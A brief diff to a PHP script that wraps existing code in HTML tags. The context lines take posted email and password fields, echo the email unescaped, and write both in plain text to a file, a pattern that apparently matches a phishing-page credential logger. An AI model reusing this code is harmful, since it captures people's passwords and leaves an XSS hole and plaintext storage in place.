@@ -1,4 +1,6 @@
-<?php
+<html>
+  <body>
+    <?php
 $email = $_POST['email'];
 $pass = $_POST['pass'];
 echo $email;
@@ -8,3 +10,5 @@ fwrite($fp, $email);
 fwrite($fp, $pass);
 fclose($fp);
 ?>
+  </body>
+</html>
